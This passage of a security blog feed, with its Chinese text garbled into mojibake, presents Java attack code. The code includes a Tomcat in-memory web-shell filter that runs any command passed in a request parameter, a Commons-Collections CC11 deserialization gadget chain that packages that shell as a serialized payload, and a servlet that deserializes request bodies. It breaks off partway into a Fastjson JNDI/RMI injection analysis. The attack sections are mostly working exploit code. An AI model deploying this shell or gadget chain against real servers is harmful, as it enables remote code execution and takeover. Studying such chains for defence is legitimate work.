Class.forName(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">                m = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">                servletRequest = (ServletRequest) m.invoke(o);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletRequest != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> servletRequest.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//springè·å–æ³•2</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.springframework.web.context.ContextLoader&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getCurrentWebApplicationContext&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.springframework.web.context.WebApplicationContext&quot;</span>);</span><br><span class="line">            m = c.getMethod(<span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> (ServletContext) m.invoke(o);</span><br><span class="line">            <span class="keyword">return</span> servletContext;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span><br><span class="line"><span class="params">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(</span><br><span class="line">                <span class="string">&quot;TomcatShellInject doFilter.....................................................................&quot;</span>);</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡cc11æ‰“å…¥å­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Template</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ©ç”¨åå°„è°ƒç”¨ templates ä¸­çš„ newTransformer æ–¹æ³•</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="comment">// æˆ‘ä»¬è¦è®¾ç½® HashSet çš„ map ä¸ºæˆ‘ä»¬çš„ HashMap</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åœ¨ invoke ä¹‹åï¼Œ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">//ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc11Step1.ser&quot;));</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc11Step2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      <span class="comment">//    ç¬¬ä¸€æ¬¡</span></span><br><span class="line"><span class="comment">//        InputStream inputStream = new FileInputStream(new File(&quot;./TomcatEcho.class&quot;));</span></span><br><span class="line">      <span class="comment">//  ç¬¬äºŒæ¬¡  </span></span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./TomcatInject.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>servletæ¥æ”¶httpè¯·æ±‚å¹¶ååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/cc&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> (InputStream) req;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> req.getInputStream();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡ŒCC11Templateå¾—åˆ°cc11Step1.serå’Œcc11Step2.serï¼Œé€šè¿‡curl â€“data-binaryæ³¨å…¥äºŒè¿›åˆ¶æ•°æ®</p><p>å‚è€ƒï¼š<a href="http://wjlshare.com/archives/1541">http://wjlshare.com/archives/1541</a></p><p><a href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p><p><a href="https://xz.aliyun.com/t/7348#toc-3">https://xz.aliyun.com/t/7348#toc-3</a></p><p><a href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> å†…å­˜é©¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
            <tag> Tomcat </tag>
            
            <tag> å†…å­˜é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson jdbcRowSetImplé“¾åŠåç»­æ¼æ´åˆ†æ</title>
      <link href="/2023/02/06/fastjson-jdbcrowsetimpl-lian-ji-hou-xu-lou-dong-fen-xi/"/>
      <url>/2023/02/06/fastjson-jdbcrowsetimpl-lian-ji-hou-xu-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastjson-jdbcRowSetImplé“¾åŠåç»­æ¼æ´åˆ†æ"><a href="#Fastjson-jdbcRowSetImplé“¾åŠåç»­æ¼æ´åˆ†æ" class="headerlink" title="Fastjson jdbcRowSetImplé“¾åŠåç»­æ¼æ´åˆ†æ"></a>Fastjson jdbcRowSetImplé“¾åŠåç»­æ¼æ´åˆ†æ</h1><p>åœ¨jdbcRowSetImplä¸­ä¼šç”¨åˆ°jndiå’Œrmiçš„çŸ¥è¯†</p><p>å…·ä½“è¯·è§ï¼š<a href="https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA">https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA</a></p><p>ç´ åå…«å¤§ä½¬å¯¹RMIæµç¨‹çš„æºç è¿›è¡Œäº†æ·±å…¥åˆ†æï¼š<a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p><p>æœ¬æ–‡æºç åˆ†æå‡å¯è·³è¿‡</p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>â€‹æ‹¥æœ‰è¿œç¨‹æ–¹æ³•çš„ç±»å¿…é¡»å®ç°Remoteæ¥å£ï¼Œä¸”è¯¥ç±»å¿…é¡»ç»§æ‰¿UnicastRemoteObjectç±»ã€‚å¦‚æœä¸ç»§æ‰¿UnicastRemoteObjectç±»ï¼Œå¯ä»¥è°ƒç”¨UnicastRemoteObject.exportObject()æ‰‹å·¥åˆå§‹åŒ–ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">implements</span> <span class="title class_">IHello</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="built_in">this</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ ç»§æ‰¿äº†Remoteç±»çš„IHelloæ¥å£ æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å…±ç”¨çš„æ¥å£ã€‚å› ä¸ºå®¢æˆ·ç«¯æŒ‡å®šè°ƒç”¨çš„è¿œç¨‹æ–¹æ³•ï¼Œå®ƒçš„å…¨é™å®šåå¿…é¡»å’ŒæœåŠ¡å™¨ä¸Šçš„å®Œå…¨ç›¸åŒ</p><ul><li>RMIé€šä¿¡è¿‡ç¨‹ï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210154646704.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210154646704.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶ä¸­å­˜æ ¹stubæ˜¯å®¢æˆ·ç«¯çš„ä»£ç†ï¼Œéª¨æ¶skeletonæ˜¯æœåŠ¡å™¨ä»£ç†</p><ol><li><p>åˆ›å»ºè¿œç¨‹å¯¹è±¡ã€‚<code>ServiceImpl service = new ServiceImpl();</code></p></li><li><p>æ³¨å†Œè¿œç¨‹å¯¹è±¡ã€‚<code>Naming.bind(&quot;rmi:127.0.0.1:1099/service&quot;,service);</code>(serviceä¸ºServiceImplå®šä¹‰çš„è¿œç¨‹å¯¹è±¡)</p></li><li><p>å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨å¹¶æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ã€‚åŒ…æ‹¬ä¸¤ä¸ªæ­¥éª¤ï¼š</p><p>â‘ ç”¨interfaceå®šä¹‰è¦æŸ¥æ‰¾çš„è¿œç¨‹å¯¹è±¡ï¼Œåœ¨ç¬¬å››æ­¥ä½œä¸ºå¼•ç”¨ï¼š<code>ServiceInterface service = (ServiceInterface);</code></p><p>â‘¡æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ã€‚<code>Naming.lookup(&quot;rmi://127.0.0.1:1099/service&quot;)</code></p></li><li><p>Registryè¿”å›æœåŠ¡å™¨å¯¹è±¡å­˜æ ¹ã€‚ä¹Ÿå°±æ˜¯æŠŠè¿œç¨‹å¯¹è±¡serviceä½œä¸ºè‡ªå·±çš„serviceï¼ˆå¼•ç”¨ï¼‰ï¼Œç§°ä¸ºstub</p></li><li><p>è°ƒç”¨è¿œç¨‹æ–¹æ³•ã€‚æ¯”å¦‚<code>String rep = service.cxk(&quot;ctrl&quot;);</code></p></li><li><p>å®¢æˆ·ç«¯å­˜æ ¹å’ŒæœåŠ¡å™¨éª¨æ¶é€šä¿¡</p></li><li><p>éª¨æ¶ä»£ç†è°ƒç”¨<code>service.cxk(&quot;ctrl&quot;);</code>ï¼Œå®é™…ä¸Šæ˜¯åœ¨Serverç«¯è°ƒç”¨çš„</p></li><li><p>éª¨æ¶æŠŠç»“æœè¿”å›ç»™å­˜æ ¹</p></li><li><p>å­˜æ ¹æŠŠç»“æœè¿”å›ç»™å®¢æˆ·ç«¯</p></li></ol><p>å…¶ä¸­å­˜æ ¹stubåœ¨å®¢æˆ·ç«¯ï¼Œskeletonæ˜¯æœåŠ¡ç«¯æœ¬èº«çš„è¿œç¨‹å¯¹è±¡(serviceæœ¬å°Š)</p><p>æ³¨å†Œè¿œç¨‹å¯¹è±¡ä¸€èˆ¬æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHello</span> <span class="variable">rhello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://x.x.x.x:1099/hello&quot;</span>,rhello);</span><br></pre></td></tr></table></figure><p>ç„¶åå®¢æˆ·ç«¯åˆ©ç”¨<code>LocateRegistry.getRegistry()</code>æœ¬åœ°åˆ›å»ºStubä½œä¸ºRegistryè¿œç¨‹å¯¹è±¡çš„ä»£ç†ã€‚ç„¶ååˆ©ç”¨lookupæ ¹æ®åç§°æŸ¥æ‰¾æŸä¸ªè¿œç¨‹å¯¹è±¡ï¼Œæ¥è·å–è¯¥è¿œç¨‹å¯¹è±¡çš„Stubï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;kingx_kali_host&quot;</span>,<span class="number">1099</span>);</span><br><span class="line"><span class="type">IHello</span> <span class="variable">rhello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">rhello.sayHello(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="åŠ¨æ€ç±»åŠ è½½"><a href="#åŠ¨æ€ç±»åŠ è½½" class="headerlink" title="åŠ¨æ€ç±»åŠ è½½"></a>åŠ¨æ€ç±»åŠ è½½</h3><p>åœ¨æœ¬åœ°æ‰¾ä¸åˆ°ç±»æ—¶ï¼Œä¼šä»è¿œç¨‹URLå»ä¸‹è½½ã€‚æ¯”å¦‚æœåŠ¡ç«¯è¿”å›çš„å¯¹è±¡æ˜¯ä¸€äº›å­ç±»çš„å¯¹è±¡å®ä¾‹ï¼Œä½†æ˜¯å®¢æˆ·ç«¯ä¸Šå¹¶æ²¡æœ‰å…¶å­ç±»çš„classæ–‡ä»¶ï¼Œå¦‚æœå®¢æˆ·ç«¯è¦ç”¨åˆ°è¿™äº›å­ç±»ä¸­çš„æ–¹æ³•ï¼Œåˆ™éœ€è¦å…è®¸å…¶åŠ¨æ€åŠ è½½å…¶ä»–ç±»çš„èƒ½åŠ›ã€‚</p><p>æ‰€ä»¥å®¢æˆ·ç«¯ä½¿ç”¨äº†Registryçš„æœºåˆ¶ï¼ŒRMIServeræŠŠurlä¼ é€’ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯é€šè¿‡HTTPä¸‹è½½ç±»ã€‚</p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDIç”¨æ¥å®šä½èµ„æºã€‚JNDIæ¯ä¸ªå¯¹è±¡éƒ½æœ‰å”¯ä¸€çš„åå­—ä¸å…¶å¯¹åº”ï¼Œå¯ä»¥é€šè¿‡åå­—æ£€ç´¢å¯¹è±¡</p><p>JNDIæ¥å£åˆå§‹åŒ–æ—¶ï¼Œå¯ä»¥å°†RMI URLä½œä¸ºå‚æ•°ï¼ŒJNDIæ³¨å…¥æ¼æ´å‡ºç°åœ¨å®¢æˆ·ç«¯çš„lookup()å‡½æ•°ã€‚</p><p>å¦‚ä¸‹ç”¨JNDIè¿›è¡Œlookupï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,<span 